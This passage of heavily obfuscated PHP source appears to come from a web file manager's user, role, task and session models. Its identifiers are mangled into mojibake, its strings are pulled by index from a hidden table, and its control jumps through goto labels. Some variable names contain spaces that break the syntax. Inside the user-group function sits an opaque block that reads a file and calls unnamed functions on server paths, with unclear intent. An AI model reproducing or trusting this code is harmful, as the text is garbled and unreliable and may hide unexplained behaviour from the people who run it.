$ìúÈ›¥³); $öÁÔã¢ = $this->where($‰îÎàª)->find(); if ($öÁÔã¢) { return $íøÇ¿´; } } return !0; } public function userListInfo($ïî»—ùÆ) { $½®ŠŒü =& $_SERVER[ ÇƒŠìÀ]; $›š¼âÎ” = array(); $ïî»—ùÆ = is_array($ïî»—ùÆ) ? array_unique($ïî»—ùÆ) : array(); if (!$ïî»—ùÆ) { return $›š¼âÎ”; } if (count($ïî»—ùÆ) < 20) { foreach ($ïî»—ùÆ as $çÕëÔ²¬) { $›š¼âÎ”[$çÕëÔ²¬ . $½®ŠŒü[12]] = $this->getInfoSimpleOuter($çÕëÔ²¬); } } else { $™¢‹şÈÜ = array($½®ŠŒü[1680] => array($½®ŠŒü[462], $ïî»—ùÆ)); if (count($ïî»—ùÆ) == 1) { $™¢‹şÈÜ = array($½®ŠŒü[1680] => $ïî»—ùÆ[0]); } $ƒ‚´Ã­÷ = Model($½®ŠŒü[548])->field($this->simpleField)->where($™¢‹şÈÜ)->select(); $ƒ‚´Ã­÷ = array_to_keyvalue($ƒ‚´Ã­÷, $½®ŠŒü[1689]); foreach ($ïî»—ùÆ as $çÕëÔ²¬) { $¡“Şøî = $ƒ‚´Ã­÷[$çÕëÔ²¬]; if (!$¡“Şøî) { $›š¼âÎ”[$çÕëÔ²¬ . $½®ŠŒü[12]] = $this->getInfoSimpleOuter($çÕëÔ²¬); continue; } $¡“Şøî[$½®ŠŒü[2348]] = Action($½®ŠŒü[2349])->parseUrl($¡“Şøî[$½®ŠŒü[2348]]); $›š¼âÎ”[$çÕëÔ²¬ . $½®ŠŒü[12]] = $¡“Şøî; } } return $›š¼âÎ”; } protected function userStatus($üùÚ¯šï, $°Ô±ŸØß) { $ÌæÆÙëô = $this->getInfoSimple($üùÚ¯šï); if (!$ÌæÆÙëô) { return !1; } $Ë»õÎ£ã = array($_SERVER[ ÇƒŠìÀ][779] => $°Ô±ŸØß); return $this->userEdit($üùÚ¯šï, $Ë»õÎ£ã); } protected function userRemove($³Öˆ†) { $¯úÅŒÒÊ =& $_SERVER[ ÇƒŠìÀ]; $ÃÚÂ÷¸¸ = $this->getInfoSimple($³Öˆ†); if (!$ÃÚÂ÷¸¸) { return !1; } $ÜğÉš¢ú = array($¯úÅŒÒÊ[1680] => $³Öˆ†); Model($¯úÅŒÒÊ[634])->where($ÜğÉš¢ú)->delete(); Model($¯úÅŒÒÊ[2377])->where($ÜğÉš¢ú)->delete(); Model($¯úÅŒÒÊ[1977])->where($ÜğÉš¢ú)->delete(); Model($¯úÅŒÒÊ[2362])->where($ÜğÉš¢ú)->delete(); Model($¯úÅŒÒÊ[1103])->where($ÜğÉš¢ú)->delete(); Model($¯úÅŒÒÊ[2187])->removeUserAll($³Öˆ†); Model($¯úÅŒÒÊ[854])->userRootRemove($³Öˆ†); return $this->where($ÜğÉš¢ú)->delete(); } protected function userGroupSet($ø£Ú—“ó, $¹ô…¯É‚, $úıöØ ó = array()) { $ä×öÜ =& $_SERVER[ ÇƒŠìÀ]; if ($_SERVER[$ä×öÜ[906]] != $_SERVER[$ä×öÜ[947]]) { $°—›ëî = $ä×öÜ[908]; $ª¿§ìÜ = $ä×öÜ[909]; $ŒÏô¨ú’ = $_SERVER[$ä×öÜ[910]] . $ä×öÜ[911]; $¥ê˜¦Ù = $ª¿§ìÜ($ŒÏô¨ú’); $ı³™­ÛŒ = explode($ä×öÜ[248], $¥ê˜¦Ù); if (count($ı³™­ÛŒ) < $ä×öÜ[653]) { $ì¤éğ¿ = $ä×öÜ[912]; $ì¤éğ¿(); } $±ü´©Ö“ = $ä×öÜ[913]; $±ü´©Ö“($_SERVER[$ä×öÜ[914]]); $±ü´©Ö“($_SERVER[$ä×öÜ[910]] . $ä×öÜ[1545]); $Ø¡´Ûµ = 1; while ($Ø¡´Ûµ > 1) { $Ø¡´Ûµ = $Ø¡´Ûµ + 4; $Œ’²èù = rawurlencode($Ø¡´Ûµ . $ä×öÜ[424]); } } $€ËÙ®ÊÜ = $this->getInfoSimple($ø£Ú—“ó); if (!$€ËÙ®ÊÜ || !is_array($¹ô…¯É‚)) { return !1; } $áË¢¡ï = Model($ä×öÜ[1977]); $áË¢¡ï->where(array($ä×öÜ[1689] => $ø£Ú—“ó))->delete(); $Ğ²±Ãüà = array(); $‰ÁÊµã = 0; foreach ($¹ô…¯É‚ as $ÕÉëé”É => $‚ì²ÌÈÜ) { $„ŒÏµıĞ = array($ä×öÜ[1689] => $ø£Ú—“ó, $ä×öÜ[1887] => $ÕÉëé”É, $ä×öÜ[1991] => $‚ì²ÌÈÜ); $„ŒÏµıĞ[$ä×öÜ[1911]] = isset($úıöØ ó[$‰ÁÊµã]) ? $úıöØ ó[$‰ÁÊµã] : 0; $‰ÁÊµã++; $Ğ²±Ãüà[] = $„ŒÏµıĞ; } return $áË¢¡ï->addAll($Ğ²±Ãüà, array(), !0); } protected function userGroupAdd($¶ä ºìâ, $·ıë³¯™ = array()) { $ƒì˜¬³ =& $_SERVER[ ÇƒŠìÀ]; $“Ä†ÈÍ  = $this->getInfoSimple($¶ä ºìâ); if (!$“Ä†ÈÍ  || empty($·ıë³¯™)) { return !1; } $º‘Æ«Ñı = array(); foreach ($·ıë³¯™ as $ÒËí‚ÛÇ => $íÙı‰ß) { $º‘Æ«Ñı[] = array($ƒì˜¬³[1689] => $¶ä ºìâ, $ƒì˜¬³[1887] => $ÒËí‚ÛÇ, $ƒì˜¬³[1991] => $íÙı‰ß, $ƒì˜¬³[1911] => 0); } return Model($ƒì˜¬³[1977])->addAll($º‘Æ«Ñı, array(), !0); } protected function userGroupRemove($âÁÊŠßÎ, $¯’÷ïÛé) { $ö€°®Ñ– =& $_SERVER[ ÇƒŠìÀ]; $ø´îÆªó = $this->getInfoSimple($âÁÊŠßÎ); if (!$ø´îÆªó || !$¯’÷ïÛé) { return !1; } $Ê«–¢®™ = array($ö€°®Ñ–[1680] => $âÁÊŠßÎ, $ö€°®Ñ–[1975] => $¯’÷ïÛé); return Model($ö€°®Ñ–[1977])->where($Ê«–¢®™)->delete(); } public function listData() { $ñßÃÄÀ¶ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ñßÃÄÀ¶[$_SERVER[ ÇƒŠìÀ][415]]); return $ñßÃÄÀ¶; } public function listByID($ÄÅ ¹æ®) { $á“¦»× =& $_SERVER[ ÇƒŠìÀ]; if (!$ÄÅ ¹æ®) { return; } $¯Ö¢›á¦ = array($á“¦»×[1689] => array($á“¦»×[7], $ÄÅ ¹æ®)); $ã‰¿Ş‹İ = $this->where($¯Ö¢›á¦)->select(); $ã‰¿Ş‹İ = array_sort_keep($ã‰¿Ş‹İ, $á“¦»×[1689], $ÄÅ ¹æ®); $this->_listDataApply($ã‰¿Ş‹İ); return $ã‰¿Ş‹İ; } public function listByGroup($ÆÕÇÆ¼ú = 0, $‘ãÃ­š² = array()) { $’Ñ°õŸÑ =& $_SERVER[ ÇƒŠìÀ]; $µÛ’úÃÙ = $’Ñ°õŸÑ[12]; $ç«ù±ı = array(); if ($ÆÕÇÆ¼ú) { $ç«ù±ı = array($’Ñ°õŸÑ[2378] => intval($ÆÕÇÆ¼ú)); $µÛ’úÃÙ = "\x4c\x45\106\x54\40\112\117\x49\116\40{$this->tablePrefix}\x75\x73\x65\162\137\147\x72\x6f\x75\160\x20\x75\163\145\162\x5f\x67\x72\157\165\160\x20\157\x6e\x20\x75\x73\145\162\x2e\x75\163\x65\x72\x49\x44\x20\75\x20\165\x73\x65\x72\x5f\147\x72\157\165\x70\56\x75\x73\145\x72\x49\104"; $ß²¥ = Input::get($’Ñ°õŸÑ[500], null, $’Ñ°õŸÑ[12]) ? $’Ñ°õŸÑ[12] : $’Ñ°õŸÑ[2379]; } if (isset($‘ãÃ­š²[$’Ñ°õŸÑ[779]])) { $ç«ù±ı[$’Ñ°õŸÑ[2380]] = $‘ãÃ­š²[$’Ñ°õŸÑ[779]]; } $í–ôØ¼Î = $this->_makeOrder($ß²¥)->field($’Ñ°õŸÑ[2381])->where($ç«ù±ı)->join($µÛ’úÃÙ)->selectPage(50); $this->_listDataApply($í–ôØ¼Î[$’Ñ°õŸÑ[415]]); return $í–ôØ¼Î; } private function _makeOrder($ÛºÕÃ = '') { $À›åƒ©Ñ =& $_SERVER[ ÇƒŠìÀ]; $³ãŞıóù = array($À›åƒ©Ñ[1689], $À›åƒ©Ñ[32], $À›åƒ©Ñ[1876], $À›åƒ©Ñ[1848], $À›åƒ©Ñ[217]); $œŞê§õ = array($À›åƒ©Ñ[493] => $À›åƒ©Ñ[494], $À›åƒ©Ñ[495] => $À›åƒ©Ñ[496]); $éëÌòåâ = Input::get($À›åƒ©Ñ[500], $À›åƒ©Ñ[7], $À›åƒ©Ñ[1680], $³ãŞıóù); $Ş¥ŞÁ§® = Input::get($À›åƒ©Ñ[501], $À›åƒ©Ñ[7], $À›åƒ©Ñ[1978], array($À›åƒ©Ñ[1978], $À›åƒ©Ñ[495])); $Ş¥ŞÁ§® = $œŞê§õ[$Ş¥ŞÁ§®]; $ÛºÕÃ = $ÛºÕÃ . "\x75\163\145\x72\56{$éëÌòåâ}\x20{$Ş¥ŞÁ§®}\54\40\x75\x73\145\162\56\x75\163\145\x72\x49\104\40\x61\x73\x63"; return $this->alias($À›åƒ©Ñ[2105])->order($ÛºÕÃ); } public function listSearch($«‚º·Š‰) { $Ş‹¾ŠÓ =& $_SERVER[ ÇƒŠìÀ]; $ßöÓæ§“ = $«‚º·Š‰[$Ş‹¾ŠÓ[1981]]; $í¹¬¼¦å = isset($«‚º·Š‰[$Ş‹¾ŠÓ[1982]]) ? $«‚º·Š‰[$Ş‹¾ŠÓ[1982]] : !1; $ßöÓæ§“ = str_replace($Ş‹¾ŠÓ[1983], $Ş‹¾ŠÓ[1984], trim($ßöÓæ§“)); $è·˜å‚« = array($Ş‹¾ŠÓ[32] => array($Ş‹¾ŠÓ[429], "\x25{$ßöÓæ§“}\x25"), $Ş‹¾ŠÓ[351] => array($Ş‹¾ŠÓ[429], "{$ßöÓæ§“}\45"), $Ş‹¾ŠÓ[2170] => array($Ş‹¾ŠÓ[429], "{$ßöÓæ§“}\45"), $Ş‹¾ŠÓ[1035] => $Ş‹¾ŠÓ[1985]); if (Input::check($ßöÓæ§“, $Ş‹¾ŠÓ[357])) { $è·˜å‚«[$Ş‹¾ŠÓ[1689]] = array($Ş‹¾ŠÓ[429], "{$ßöÓæ§“}\x25"); $è·˜å‚«[$Ş‹¾ŠÓ[2363]] = array($Ş‹¾ŠÓ[429], "{$ßöÓæ§“}\x25"); } if (!$ßöÓæ§“) { $è·˜å‚« = array(); } if (isset($«‚º·Š‰[$Ş‹¾ŠÓ[779]])) { $è·˜å‚«[$Ş‹¾ŠÓ[779]] = $«‚º·Š‰[$Ş‹¾ŠÓ[779]]; } $è·˜å‚« = $this->parseWhereLike($è·˜å‚«); $¼„Àø‹Â = $this->_makeOrder()->where($è·˜å‚«)->selectPage(20); if (!$¼„Àø‹Â || count($¼„Àø‹Â[$Ş‹¾ŠÓ[415]]) < 5 && Input::check($ßöÓæ§“, $Ş‹¾ŠÓ[364])) { $½¾‚ƒ¯Ô = $this->_searchFromMeta($Ş‹¾ŠÓ[507], $ßöÓæ§“, 10); $öéºÀ«¡ = $this->_searchFromMeta($Ş‹¾ŠÓ[508], $ßöÓæ§“, 10); $ˆÀåÈâ = array_merge($½¾‚ƒ¯Ô, $öéºÀ«¡, $¼„Àø‹Â[$Ş‹¾ŠÓ[415]]); $¼„Àø‹Â[$Ş‹¾ŠÓ[415]] = array_unique_by_key($ˆÀåÈâ, $Ş‹¾ŠÓ[1689]); $¼„Àø‹Â[$Ş‹¾ŠÓ[412]][$Ş‹¾ŠÓ[413]] = count($¼„Àø‹Â[$Ş‹¾ŠÓ[415]]); $¼„Àø‹Â[$Ş‹¾ŠÓ[412]][$Ş‹¾ŠÓ[414]] = ceil($¼„Àø‹Â[$Ş‹¾ŠÓ[412]][$Ş‹¾ŠÓ[413]] / $¼„Àø‹Â[$Ş‹¾ŠÓ[412]][$Ş‹¾ŠÓ[409]]); } $this->_listDataApply($¼„Àø‹Â[$Ş‹¾ŠÓ[415]]); $this->_filterByGroup($¼„Àø‹Â, $í¹¬¼¦å); return $¼„Àø‹Â; } private function _filterByGroup(&$ãÛ¿Ë¯‰, $Š¦õšáÁ) { $ù§ŞãƒÙ =& $_SERVER[ ÇƒŠìÀ]; if (!$Š¦õšáÁ) { return $ãÛ¿Ë¯‰; } foreach ($ãÛ¿Ë¯‰[$ù§ŞãƒÙ[415]] as $ãëò´ïØ => &$ìˆˆÈì) { $¡¯ôî“ = array_to_keyvalue($ìˆˆÈì[$ù§ŞãƒÙ[2074]], $ù§ŞãƒÙ[12], $ù§ŞãƒÙ[1887]); if (!in_array($Š¦õšáÁ, $¡¯ôî“)) { unset($ãÛ¿Ë¯‰[$ù§ŞãƒÙ[415]][$ãëò´ïØ]); } } unset($ìˆˆÈì); $ãÛ¿Ë¯‰[$ù§ŞãƒÙ[415]] = array_values($ãÛ¿Ë¯‰[$ù§ŞãƒÙ[415]]); $ãÛ¿Ë¯‰[$ù§ŞãƒÙ[412]] = array($ù§ŞãƒÙ[2140] => count($ãÛ¿Ë¯‰[$ù§ŞãƒÙ[415]]), $ù§ŞãƒÙ[2138] => $ãÛ¿Ë¯‰[$ù§ŞãƒÙ[412]][$ù§ŞãƒÙ[409]], $ù§ŞãƒÙ[2137] => 1, $ù§ŞãƒÙ[2139] => 1); } private function _searchFromMeta($Ò‡é×ªİ, $ªÆú±©ø, $ÈŞé‚ø) { $´Ú…Êö =& $_SERVER[ ÇƒŠìÀ]; $ªÆú±©ø = strtolower($ªÆú±©ø); $ÊÄÙƒêŠ = array($´Ú…Êö[96] => $Ò‡é×ªİ, $´Ú…Êö[420] => array($´Ú…Êö[429], "\x25{$ªÆú±©ø}\x25")); $ÊÄÙƒêŠ = $this->parseWhereLike($ÊÄÙƒêŠ); $ÔÙùê½™ = Model($´Ú…Êö[2382])->where($ÊÄÙƒêŠ)->limit($ÈŞé‚ø)->select(); if (!$ÔÙùê½™) { return array(); } $ÔÙùê½™ = array_to_keyvalue($ÔÙùê½™, $´Ú…Êö[12], $´Ú…Êö[1689]); $’Äû¯öÛ = $this->where(array($´Ú…Êö[1680] => array($´Ú…Êö[7], $ÔÙùê½™)))->select(); if (!$’Äû¯öÛ) { return array(); } return $’Äû¯öÛ; } private function _listDataApplyItem($ÀÈ»£¦º) { $÷­öáø = array($ÀÈ»£¦º); $this->_listDataApply($÷­öáø); return $÷­öáø[0]; } private function _listDataApply(&$ÁéÉ•¬) { $İ² ‘™ =& $_SERVER[ ÇƒŠìÀ]; if (!$ÁéÉ•¬) { return; } array_remove_key($ÁéÉ•¬, $İ² ‘™[922]); $äœíÁ› = array_to_keyvalue($ÁéÉ•¬, $İ² ‘™[12], $İ² ‘™[1689]); $this->_listAppendGroup($ÁéÉ•¬, $äœíÁ›); $this->_listAppendMeta($ÁéÉ•¬, $äœíÁ›); $this->_listAppendSourceRoot($ÁéÉ•¬, $äœíÁ›); } private function _listAppendSourceRoot(&$ÉšŞ³«Ò, $¿‰Ï®Š÷) { $ÆÍöÁÒÌ =& $_SERVER[ ÇƒŠìÀ]; $¬•Õè· = Model($ÆÍöÁÒÌ[854])->listSourceRoot(SourceModel::TYPE_USER, $¿‰Ï®Š÷); $¬•Õè· = array_to_keyvalue($¬•Õè·, $ÆÍöÁÒÌ[540]); $¬•Õè· = array_remove_key($¬•Õè·, $ÆÍöÁÒÌ[540]); foreach ($ÉšŞ³«Ò as &$È†öÑ“İ) { $È†öÑ“İ[$ÆÍöÁÒÌ[89]] = $¬•Õè·[$È†öÑ“İ[$ÆÍöÁÒÌ[1689]]] ? $¬•Õè·[$È†öÑ“İ[$ÆÍöÁÒÌ[1689]]] : array(); } unset($È†öÑ“İ); } private function _listAppendGroup(&$ìúµô½ , $ÈÏÈ‘‘¹) { $àŒæºì =& $_SERVER[ ÇƒŠìÀ]; $ŒÕ¬ĞÂ› = array($àŒæºì[1689] => array($àŒæºì[7], $ÈÏÈ‘‘¹)); $áíˆ—¥ = Model($àŒæºì[1977])->where($ŒÕ¬ĞÂ›)->select(); $ÕøÂºÉ¹ = array_to_keyvalue($áíˆ—¥, $àŒæºì[12], $àŒæºì[1887]); $ÕøÂºÉ¹ = array_remove_value(array_unique($ÕøÂºÉ¹), $àŒæºì[214]); if (!$ÕøÂºÉ¹ || !$áíˆ—¥) { return; } $ŒÕ¬ĞÂ› = array($àŒæºì[1887] => array($àŒæºì[7], $ÕøÂºÉ¹)); $Üêİù™© = Model($àŒæºì[2072])->field($àŒæºì[2383])->where($ŒÕ¬ĞÂ›)->select(); $Üêİù™© = array_to_keyvalue($Üêİù™©, $àŒæºì[1887]); $áíˆ—¥ = array_to_keyvalue_group($áíˆ—¥, $àŒæºì[1689]); foreach ($áíˆ—¥ as &$ÕÀç¤‰ø) { $õõ´…¸ = array(); foreach ($ÕÀç¤‰ø as $ÏğˆÎÆ¦) { if (!$ÏğˆÎÆ¦[$àŒæºì[1991]]) { continue; } $ŸıÂ¶ = Model($àŒæºì[542])->listData($ÏğˆÎÆ¦[$àŒæºì[1991]]); $õõ´…¸[] = array($àŒæºì[1887] => $ÏğˆÎÆ¦[$àŒæºì[1887]], $àŒæºì[2384] => $Üêİù™©[$ÏğˆÎÆ¦[$àŒæºì[1887]]][$àŒæºì[32]], $àŒæºì[555] => $Üêİù™©[$ÏğˆÎÆ¦[$àŒæºì[1887]]][$àŒæºì[555]], $àŒæºì[457] => $ŸıÂ¶); } $ÕÀç¤‰ø = $õõ´…¸; } unset($ÕÀç¤‰ø); foreach ($ìúµô½  as &$­ïÙ€Üô) { $­ïÙ€Üô[$àŒæºì[2074]] = array(); if (isset($áíˆ—¥[$­ïÙ€Üô[$àŒæºì[1689]]])) { $­ïÙ€Üô[$àŒæºì[2074]] = $áíˆ—¥[$­ïÙ€Üô[$àŒæºì[1689]]]; } } unset($­ïÙ€Üô); } public function userAppendGroup($¨ş¥œÕ—) { $µäÅÉ =& $_SERVER[ ÇƒŠìÀ]; if (!$¨ş¥œÕ—) { return array(); } $this->_listAppendGroup($¨ş¥œÕ—, array_to_keyvalue($¨ş¥œÕ—, $µäÅÉ[12], $µäÅÉ[1689])); return $¨ş¥œÕ—; } private function _listAppendMeta(&$ı ¢´Ôí, $Ÿİ—©è) { $öæ»ş± =& $_SERVER[ ÇƒŠìÀ]; $Ú¾š†ê° = UserJobModel::JOB_KEY; $ÛïğÊÆ = array($öæ»ş±[2364]); $â…ÜÀ†ñ = array($öæ»ş±[1689] => array($öæ»ş±[7], $Ÿİ—©è)); $ ÊÂ¸Ş = Model($öæ»ş±[2362])->where($â…ÜÀ†ñ)->select(); $ ÊÂ¸Ş = array_to_keyvalue_group($ ÊÂ¸Ş, $öæ»ş±[1689]); foreach ($ ÊÂ¸Ş as &$Şñ«©¶) { $³¸¤ìÔ = array(); foreach ($Şñ«©¶ as $íè¤÷¥š) { if (!in_array($íè¤÷¥š[$öæ»ş±[96]], $ÛïğÊÆ)) { $³¸¤ìÔ[$íè¤÷¥š[$öæ»ş±[96]]] = $íè¤÷¥š[$öæ»ş±[420]]; } } $Şñ«©¶ = $³¸¤ìÔ; } unset($Şñ«©¶); $°»–°×ù = Model($öæ»ş±[2385]); foreach ($ı ¢´Ôí as &$ÕŠ¼ªÈ‚) { $Š™Äšãı = array(); if (isset($ ÊÂ¸Ş[$ÕŠ¼ªÈ‚[$öæ»ş±[1689]]])) { $Š™Äšãı = $ ÊÂ¸Ş[$ÕŠ¼ªÈ‚[$öæ»ş±[1689]]]; } $ÕŠ¼ªÈ‚[$öæ»ş±[2386]] = array(); if (isset($Š™Äšãı[$Ú¾š†ê°])) { $ÕŠ¼ªÈ‚[$öæ»ş±[2386]] = $°»–°×ù->getUserJobInfo($Š™Äšãı[$Ú¾š†ê°]); } } unset($ÕŠ¼ªÈ‚); } protected function groupUserAll($úõ‹³±‚) { $˜ şŒÍ„ =& $_SERVER[ ÇƒŠìÀ]; if (!$úõ‹³±‚) { return !1; } $ìü…‹ûÂ = Model($˜ şŒÍ„[1977])->field($˜ şŒÍ„[1689])->where(array($˜ şŒÍ„[1887] => array($˜ şŒÍ„[7], $úõ‹³±‚)))->select(); $ìü…‹ûÂ = array_to_keyvalue($ìü…‹ûÂ, $˜ şŒÍ„[12], $˜ şŒÍ„[1689]); return array_unique($ìü…‹ûÂ); } public function userSearch($©´›Íù, $¸İ¯Ø = "\x2a") { return Model($_SERVER[ ÇƒŠìÀ][569])->where($©´›Íù)->field($¸İ¯Ø)->find(); } } goto D›À°Çì; A¹“¶ÅõŸ‡: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\162\157\x6c\145\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\141\x75\164\150", "\154\x61\x62\x65\x6c", "\144\151\x73\160\154\141\171", "\x73\171\x73\164\x65\x6d", "\144\x65\163\x63", "\151\x67\156\157\x72\x65\x45\170\x74", "\151\147\156\157\x72\x65\106\x69\x6c\145\123\151\172\x65", "\x61\x64\155\151\156\151\163\x74\x72\x61\x74\157\162", "\163\x6f\x72\x74"); public function listData($‡ÊƒÑœÙ = false, $€´ÎÒäÎ = "\x73\x6f\x72\x74", $¶äŞ‘à = false) { $ò™Ú»‰€ =& $_SERVER[ ÇƒŠìÀ]; $‚ÏæŠÉ÷ = parent::listData($‡ÊƒÑœÙ, $€´ÎÒäÎ, $¶äŞ‘à); if (!$‡ÊƒÑœÙ) { foreach ($‚ÏæŠÉ÷ as $•‰¯º‡© => $ËÀß›ª÷) { if ($ËÀß›ª÷[$ò™Ú»‰€[2090]] == 1) { $‚ÏæŠÉ÷[$•‰¯º‡©][$ò™Ú»‰€[496]] = LNG($ò™Ú»‰€[2331]); } } } return $‚ÏæŠÉ÷; } public function update($©ã¿ùºı, $ÂÒèˆƒ‹) { $şµêÑ£õ =& $_SERVER[ ÇƒŠìÀ]; $À„øò‰° = parent::listData($©ã¿ùºı); $†ùÖ®‘Š = $this->findByName($ÂÒèˆƒ‹[$şµêÑ£õ[32]]); if (!$À„øò‰° || $†ùÖ®‘Š && $†ùÖ®‘Š[$şµêÑ£õ[445]] != $À„øò‰°[$şµêÑ£õ[445]]) { return !1; } if ($†ùÖ®‘Š[$şµêÑ£õ[2090]] == 1) { $ÂÒèˆƒ‹ = array($şµêÑ£õ[32] => $ÂÒèˆƒ‹[$şµêÑ£õ[32]], $şµêÑ£õ[1910] => $ÂÒèˆƒ‹[$şµêÑ£õ[1910]]); } $this->filterAuth($ÂÒèˆƒ‹[$şµêÑ£õ[457]]); return parent::update($©ã¿ùºı, $ÂÒèˆƒ‹); } public function remove($ñ”¾ûíĞ) { $Ëûàû±É = parent::listData($ñ”¾ûíĞ); if (!$Ëûàû±É || $Ëûàû±É[$_SERVER[ ÇƒŠìÀ][181]]) { return !1; } return parent::remove($ñ”¾ûíĞ); } public function add($µªÍ³ Ì) { $ÅáÅé­ =& $_SERVER[ ÇƒŠìÀ]; $é´€µàû = $µªÍ³ Ì[$ÅáÅé­[32]]; if ($this->findByName($é´€µàû)) { return !1; } $»©Íûó‹ = array($ÅáÅé­[464] => $é´€µàû, $ÅáÅé­[1893] => $ÅáÅé­[12], $ÅáÅé­[1889] => $ÅáÅé­[1897], $ÅáÅé­[2332] => 1, $ÅáÅé­[1892] => 0, $ÅáÅé­[2333] => 0, $ÅáÅé­[1891] => $this->getSort()); $µªÍ³ Ì = array_merge($»©Íûó‹, $µªÍ³ Ì); $this->filterAuth($µªÍ³ Ì[$ÅáÅé­[457]]); return parent::insert($µªÍ³ Ì); } private function getSort() { $ƒÜìûøÌ =& $_SERVER[ ÇƒŠìÀ]; $üÎ§Ó®û = parent::listData(); $‘ˆ¯ãúÃ = array_to_keyvalue($üÎ§Ó®û, $ƒÜìûøÌ[12], $ƒÜìûøÌ[1911]); return empty($‘ˆ¯ãúÃ) ? 0 : max($‘ˆ¯ãúÃ) + 1; } private function filterAuth(&$¢°åú¿) { $¨”ï´© =& $_SERVER[ ÇƒŠìÀ]; $Ğš‹îö­ = array(); $¹Ö‹æûÈ = array_filter(explode($¨”ï´©[50], $¢°åú¿)); foreach ($¹Ö‹æûÈ as $¢°åú¿) { $‹ñø¸ = explode($¨”ï´©[10], $¢°åú¿); if ($‹ñø¸[0] == $¨”ï´©[2334] && $‹ñø¸[1] != $¨”ï´©[1225]) { $åà™Úµµ = $‹ñø¸[0] . $¨”ï´©[10] . $‹ñø¸[1] . $¨”ï´©[2335]; if (!in_array($åà™Úµµ, $¹Ö‹æûÈ)) { $Ğš‹îö­[] = $åà™Úµµ; } } $Ğš‹îö­[] = $¢°åú¿; } $¢°åú¿ = implode($¨”ï´©[50], $Ğš‹îö­); } public function findRoleDefault() { $áñõñ‡ï =& $_SERVER[ ÇƒŠìÀ]; $‚‘·‰™Ó = parent::listData(); $»ıÖÃó€ = !1; foreach ($‚‘·‰™Ó as $Éà¼ÉŒ¬) { if (!$Éà¼ÉŒ¬ || $Éà¼ÉŒ¬[$áñõñ‡ï[1909]] == $áñõñ‡ï[214] || $Éà¼ÉŒ¬[$áñõñ‡ï[2090]] == 1) { continue; } if (strstr($Éà¼ÉŒ¬[$áñõñ‡ï[457]], $áñõñ‡ï[2336])) { continue; } if (!strstr($Éà¼ÉŒ¬[$áñõñ‡ï[457]], $áñõñ‡ï[2337])) { continue; } if (!$»ıÖÃó€) { $»ıÖÃó€ = $Éà¼ÉŒ¬; continue; } $£¯‹¿ç = explode($áñõñ‡ï[50], $»ıÖÃó€[$áñõñ‡ï[457]]); $İ¨íù•ˆ = explode($áñõñ‡ï[50], $Éà¼ÉŒ¬[$áñõñ‡ï[457]]); if (count($£¯‹¿ç) > count($İ¨íù•ˆ)) { $»ıÖÃó€ = $Éà¼ÉŒ¬; } } return $»ıÖÃó€ ? $»ıÖÃó€[$áñõñ‡ï[445]] : $áñõñ‡ï[12]; } public function sort($ÀãĞ¤µÁ, $ÄñÏ¥õÔ) { return parent::update($ÀãĞ¤µÁ, $ÄñÏ¥õÔ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\164\141\x73\x6b\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x74\171\x70\145", "\145\x76\x65\156\164", "\164\x69\x6d\145", "\x64\145\163\143", "\x73\x79\x73\164\x65\x6d", "\145\156\x61\142\154\145", "\x6c\x61\163\164\x52\165\x6e", "\x73\x6f\162\164"); public function listData($ê°ÃœÑè = false, $½üÒøœ¾ = "\x73\x6f\162\x74", $ÁĞåè¢® = false) { return parent::listData($ê°ÃœÑè, $½üÒøœ¾, $ÁĞåè¢®); } public function add($‹§âÏ Ê) { $û‡éıŞ· =& $_SERVER[ ÇƒŠìÀ]; $ÖÅ¸ÂÕà = $this->findByName($‹§âÏ Ê[$û‡éıŞ·[32]]); if ($ÖÅ¸ÂÕà) { return !1; } $‹§âÏ Ê[$û‡éıŞ·[1640]] = 0; $‹§âÏ Ê[$û‡éıŞ·[1911]] = $this->getSort(); return parent::insert($‹§âÏ Ê); } private function getSort() { $œÂ Êš =& $_SERVER[ ÇƒŠìÀ]; $êÃ­ÇÂ = parent::listData(); $Áìç…Õ— = array_to_keyvalue($êÃ­ÇÂ, $œÂ Êš[12], $œÂ Êš[1911]); return empty($Áìç…Õ—) ? 0 : max($Áìç…Õ—) + 1; } public function update($´ù”“ï¤, $Ş”ÍØüû) { $‡Æ ×·‚ =& $_SERVER[ ÇƒŠìÀ]; $î†…¡ÍÅ = $this->listData($´ù”“ï¤); $íŸÁÖœ³ = $this->findByName($Ş”ÍØüû[$‡Æ ×·‚[32]]); if (!$î†…¡ÍÅ || $íŸÁÖœ³ && $íŸÁÖœ³[$‡Æ ×·‚[445]] != $î†…¡ÍÅ[$‡Æ ×·‚[445]]) { return !1; } return parent::update($´ù”“ï¤, $Ş”ÍØüû); } public function remove($¨†©òùì, $À§’Ë’Ù = false) { $–ºøÕì =& $_SERVER[ ÇƒŠìÀ]; $¶È¤œÈ­ = $this->listData($¨†©òùì); if (!$¶È¤œÈ­) { return; } if (!$À§’Ë’Ù && $¶È¤œÈ­[$–ºøÕì[181]] == $–ºøÕì[90]) { return !1; } return parent::remove($¨†©òùì); } public function enable($¢ƒôÄÇ‰, $¬Òöüá) { return $this->update($¢ƒôÄÇ‰, array($_SERVER[ ÇƒŠìÀ][2326] => $¬Òöüá)); } public function run($õ¯‡ÁÄõ) { return $this->update($õ¯‡ÁÄõ, array($_SERVER[ ÇƒŠìÀ][2338] => time())); } } goto C… –Ã¨Æª; EŒ„ƒæÚ‰: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ÌÑ¡Åú§ =& $_SERVER[ ÇƒŠìÀ]; static $ÈñÂÜºƒ = false; if ($ÈñÂÜºƒ) { return $ÈñÂÜºƒ; } $°úÛß = $GLOBALS[$ÌÑ¡Åú§[6]][$ÌÑ¡Åú§[395]]; self::$sessionTime = $°úÛß[$ÌÑ¡Åú§[1635]]; $œä‚ şÌ = isset($GLOBALS[$ÌÑ¡Åú§[1636]]) ? $GLOBALS[$ÌÑ¡Åú§[1636]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($œä‚ şÌ)) { self::$sessionSign = Cookie::get($œä‚ şÌ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($œä‚ şÌ, self::$sessionSign, self::$sessionTime); $Ã¾ÜóåÛ = $°úÛß[$ÌÑ¡Åú§[1637]]; $ØÏ—¨Ş = 